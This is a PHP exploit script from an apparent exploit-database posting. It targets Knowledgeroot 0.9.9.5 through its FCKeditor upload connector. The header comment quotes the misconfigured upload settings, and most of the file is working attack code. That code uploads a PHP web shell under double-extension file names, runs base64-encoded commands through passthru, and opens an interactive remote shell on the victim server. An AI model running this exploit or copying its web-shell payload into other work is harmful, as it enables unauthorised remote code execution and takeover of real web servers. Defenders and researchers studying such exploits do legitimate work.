&lt;?php
/*
 
 1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0
 0     _                   __           __       __                     1
 1   /&#039; \            __  /&#039;__`\        /\ \__  /&#039;__`\                   0
 0  /\_, \    ___   /\_\/\_\ \ \    ___\ \ ,_\/\ \/\ \  _ ___           1
 1  \/_/\ \ /&#039; _ `\ \/\ \/_/_\_&lt;_  /&#039;___\ \ \/\ \ \ \ \/\`&#039;__\          0
 0     \ \ \/\ \/\ \ \ \ \/\ \ \ \/\ \__/\ \ \_\ \ \_\ \ \ \/           1
 1      \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\           0
 0       \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/           1
 1                  \ \____/ &gt;&gt; Exploit database separated by exploit   0
 0                   \/___/          type (local, remote, DoS, etc.)    1
 1                                                                      1
 0  [+] Site            : Inj3ct0r.com                                  0
 1  [+] Support e-mail  : submit[at]inj3ct0r.com                        1
 0                                                                      0
 1                    ########################################          1
 0                    I&#039;m eidelweiss member from Inj3ct0r Team          1
 1                    ########################################          0
 0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1
 
 Vendor: www.knowledgeroot.org
 Download : http://www.knowledgeroot.org/downloads.html
 exploited by ..: eidelweiss
 Affected: version 0.9.9.5 (Other or lowers version may also be affected)
 Greetz: all inj3ctor Team, JosS (Hack0wn), exploit-db Team, yogyacarderlink Team, devilzc0de Team
 details..: works with an Apache server with the mod_mime module installed (if specific)
   
 [-] vulnerable code in path/extension/fckeditor/fckeditor/editor/filemanager/connectors/php/config.php
      
    [*] // SECURITY: You must explicitly enable this &quot;connector&quot;. (Set it to &quot;true&quot;).
    [*]
    [*] $Config[&#039;Enabled&#039;] = true ;
    [*]
    [*] // Path to user files relative to the document root.
    [*] $Config[&#039;UserFilesPath&#039;] = $serverBasePath . $CONFIG[&#039;knowledgeroot&#039;][&#039;uploadfolder&#039;] ;
    [*]
    [*] // Fill the following value it you prefer to specify the absolute path for the
    [*] // user files directory. Usefull if you are using a virtual directory, symbolic
    [*] // link or alias. Examples: &#039;C:\\MySite\\UserFiles\\&#039; or &#039;/root/mysite/UserFiles/&#039;.
    [*] // Attention: The above &#039;UserFilesPath&#039; must point to the same directory.
    [*]
    [*]
    [*] $Config[&#039;AllowedExtensions&#039;][&#039;File&#039;]    = array(&#039;7z&#039;, &#039;aiff&#039;, &#039;asf&#039;, &#039;avi&#039;, &#039;bmp&#039;, &#039;csv&#039;, &#039;doc&#039;, &#039;fla&#039;, &#039;flv&#039;, &#039;gif&#039;, &#039;gz&#039;, [....]
    [*] $Config[&#039;DeniedExtensions&#039;][&#039;File&#039;]     = array() ;
    [*]
    [*] $Config[&#039;AllowedExtensions&#039;][&#039;Image&#039;]   = array(&#039;bmp&#039;,&#039;gif&#039;,&#039;jpeg&#039;,&#039;jpg&#039;,&#039;png&#039;) ;
    [*] $Config[&#039;DeniedExtensions&#039;][&#039;Image&#039;]    = array() ;
    [*]
    [*] $Config[&#039;AllowedExtensions&#039;][&#039;Flash&#039;]   = array(&#039;swf&#039;,&#039;flv&#039;) ;
    [*] $Config[&#039;DeniedExtensions&#039;][&#039;Flash&#039;]    = array() ;
    [*]
    [*] $Config[&#039;AllowedExtensions&#039;][&#039;Media&#039;]   = array(&#039;aiff&#039;, &#039;asf&#039;, &#039;avi&#039;, &#039;bmp&#039;, &#039;fla&#039;, &#039;flv&#039;, &#039;gif&#039;, &#039;jpeg&#039;, &#039;jpg&#039;, &#039;mid&#039;, &#039;mov&#039;, &#039;mp3&#039;, &#039;mp4&#039;, &#039;mpc&#039;, &#039;mpeg&#039;, &#039;mpg&#039;, &#039;png&#039;, &#039;qt&#039;, &#039;ram&#039;, &#039;rm&#039;, &#039;rmi&#039;, &#039;rmvb&#039;, &#039;swf&#039;, &#039;tif&#039;, &#039;tiff&#039;, &#039;wav&#039;, &#039;wma&#039;, &#039;wmv&#039;) ;
    [*] $Config[&#039;DeniedExtensions&#039;][&#039;Media&#039;]    = array() ;
      
    with a default configuration of this script, an attacker might be able to upload arbitrary
    files containing malicious PHP code due to multiple file extensions isn&#039;t properly checked
*/
  
*/
error_reporting(0);
set_time_limit(0);
ini_set(&quot;default_socket_timeout&quot;, 5);
function http_send($host, $packet)
{
 $sock = fsockopen($host, 80);
 while (!$sock)
 {
  print &quot;\n[-] No response from {$host}:80 Trying again...&quot;;
  $sock = fsockopen($host, 80);
 }
 fputs($sock, $packet);
 while (!feof($sock)) $resp .= fread($sock, 1024);
 fclose($sock);
 return $resp;
}
function upload()
{
 global $host, $path;
   
 $connector = &quot;/extension/fckeditor/fckeditor/editor/filemanager/connectors/php/config.php&quot;;
 $file_ext  = array(&quot;zip&quot;, &quot;jpg&quot;, &quot;fla&quot;, &quot;doc&quot;, &quot;xls&quot;, &quot;rtf&quot;, &quot;csv&quot;);
   
 foreach ($file_ext as $ext)
 {
  print &quot;\n[-] Trying to upload with .{$ext} extension...&quot;;
    
  $data  = &quot;--abcdef\r\n&quot;;
  $data .= &quot;Content-Disposition: form-data; name=\&quot;NewFile\&quot;; filename=\&quot;0k.php.{$ext}\&quot;\r\n&quot;;
  $data .= &quot;Content-Type: application/octet-stream\r\n\r\n&quot;;
  $data .= &quot;&lt;?php \${print(_code_)}.\${passthru(base64_decode(\$_SERVER[HTTP_CMD]))}.\${print(_code_)} ?&gt;\r\n&quot;;
  $data .= &quot;--abcdef--\r\n&quot;;
    
  $packet  = &quot;POST {$path}{$connector}?Command=FileUpload&amp;CurrentFolder={$path} HTTP/1.0\r\n&quot;;
  $packet .= &quot;Host: {$host}\r\n&quot;;
  $packet .= &quot;Content-Length: &quot;.strlen($data).&quot;\r\n&quot;;
  $packet .= &quot;Content-Type: multipart/form-data; boundary=abcdef\r\n&quot;;
  $packet .= &quot;Connection: close\r\n\r\n&quot;;
  $packet .= $data;
    
  preg_match(&quot;/OnUploadCompleted\((.*),&#039;(.*)&#039;\)/i&quot;, http_send($host, $packet), $html);
    
  if (!in_array(intval($html[1]), array(0, 201))) die(&quot;\n[-] Upload failed! (Error {$html[1]}: {$html[2]})\n&quot;);
    
  $packet  = &quot;GET {$path}0k.php.{$ext} HTTP/1.0\r\n&quot;;
  $packet .= &quot;Host: {$host}\r\n&quot;;
  $packet .= &quot;Connection: close\r\n\r\n&quot;;
  $html    = http_send($host, $packet);
    
  if (!eregi(&quot;print&quot;, $html) and eregi(&quot;_code_&quot;, $html)) return $ext;
    
  sleep(1);
 }
   
 return false;
}
print &quot;\n+------------------------------------------------------------------------------+&quot;;
print &quot;\n| Knowledgeroot (fckeditor) Remote Arbitrary File Upload Exploit by eidelweiss |&quot;;
print &quot;\n+------------------------------------------------------------------------------+\n&quot;;
if ($argc &lt; 3)
{
 print &quot;\nUsage......: php $argv[0] host path\n&quot;;
 print &quot;\nExample....: php $argv[0] localhost /&quot;;
 print &quot;\nExample....: php $argv[0] localhost /Knowledgeroot/\n&quot;;
 die();
}
$host = $argv[1];
$path = $argv[2];
if (!($ext = upload())) die(&quot;\n\n[-] Exploit failed...\n&quot;);
else print &quot;\n[-] Shell uploaded...starting it!\n&quot;;
define(STDIN, fopen(&quot;php://stdin&quot;, &quot;r&quot;));
while(1)
{
 print &quot;\Knowledgeroot-shell# &quot;;
 $cmd = trim(fgets(STDIN));
 if ($cmd != &quot;exit&quot;)
 {
  $packet = &quot;GET {$path}0k.php.{$ext} HTTP/1.0\r\n&quot;;
  $packet.= &quot;Host: {$host}\r\n&quot;;
  $packet.= &quot;Cmd: &quot;.base64_encode($cmd).&quot;\r\n&quot;;
  $packet.= &quot;Connection: close\r\n\r\n&quot;;
  $html   = http_send($host, $packet);
  if (!eregi(&quot;_code_&quot;, $html)) die(&quot;\n[-] Exploit failed...\n&quot;);
  $shell = explode(&quot;_code_&quot;, $html);
  print &quot;\n{$shell[1]}&quot;;
 }
 else break;
}
?&gt;